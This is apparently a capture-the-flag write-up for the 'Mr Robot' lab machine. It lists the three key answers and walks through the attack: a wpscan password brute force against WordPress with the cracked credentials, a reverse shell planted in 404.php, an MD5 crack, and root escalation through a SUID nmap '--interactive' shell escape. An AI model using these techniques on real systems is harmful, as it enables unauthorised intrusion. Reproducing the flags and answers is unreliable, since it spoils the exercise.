# MR ROBOT

## BASIC INFO
```
export IP=10.10.177.139
```

## HACK THE MACHINE
> - **What is key 1?**
>> 073403c8a58a1f80d943455fb30724b9

robots.txt

> - **What is key 2?**
>> 822c73956184f694993bede3eb39f959

Gobuster found wp-login\
Sort the fsocity.dic first to shrink down the size.\
wpscan on the page with username and password from fsocity.dic\


```
wpscan --url http://$IP -P fsocity_sorted.dic --usernames elliot

[!] Valid Combinations Found:
| Username: elliot, Password: ER28-0652
```

After we logged in, let's try to root the machine.\
Let's try to change the content of 404.php since we know it is running as php.\
Generate a rev_shell with msfvenom.
```
msfvenom 
```

Once we are in the meterpreter session, navigate to /home/robot and grab the password.raw-md5
```
robot:c3fcd3d76192e4007dfb496cca67e13b
robot:abcdefghijklmnopqrstuvwxyz
```
Once we su as robot then we can cat out key-2-of-3.txt

> -  **What is key 3?**
>> 04787ddef27c3dee1ee161b21670b4e4

After we are in as robot, let's try to escalate our privilege more. Let's say... root\
`find / -perm +6000 2>/dev/null` to find root process.\
From the hint it mentioned nmap. And with GTFObins we knwo the exploits.
```
nmap --interactive
!sh
```

Now we are root. `cat /root/key-3-of-3.txt`
